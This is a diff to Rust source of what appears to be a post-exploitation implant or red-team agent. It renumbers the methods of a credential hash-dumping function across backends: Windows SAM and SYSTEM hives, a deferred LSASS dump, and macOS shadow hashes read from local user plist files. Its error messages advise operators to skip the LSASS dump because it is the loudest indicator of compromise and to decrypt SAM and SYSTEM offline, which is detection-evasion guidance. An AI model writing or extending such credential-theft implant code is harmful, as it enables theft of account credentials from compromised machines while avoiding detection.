@@ -482,13 +482,20 @@ fn do_screenwatch(interval_secs: u32) -> Vec<Response> {
     }
 }
 
-/// 凭据哈希提取。
-/// method 0: LSASS dump（Windows-only，dev agent 不支持）
-/// method 1: macOS shadow hash（读 /var/db/dslocal/nodes/Default/users/<user>.plist）
+/// 凭据哈希提取。method 语义跨后端统一约定：
+///   0 = SAM hive（Windows-only，dev agent 不支持）
+///   1 = SYSTEM hive（Windows-only，dev agent 不支持）
+///   2 = LSASS dump（deferred，所有后端暂不支持）
+///   3 = macOS shadow hash（读 /var/db/dslocal/nodes/Default/users/<user>.plist）
 fn do_hashdump(method: u8) -> Response {
     match method {
-        0 => Response::Err("hashdump LSASS: Windows-only (not available in dev agent). Use BOF or Windows implant.".into()),
-        1 => {
+        0 | 1 => Response::Err(
+            "hashdump sam/system: Windows-only (use the Windows implant). Dev agent supports method=3 (shadow).".into(),
+        ),
+        2 => Response::Err(
+            "hashdump lsass: deferred (loudest IOC). Use SAM(0)+SYSTEM(1) on Windows, decrypt offline.".into(),
+        ),
+        3 => {
             // macOS: 提取所有本地用户的 shadow hash
             #[cfg(target_os = "macos")]
             {
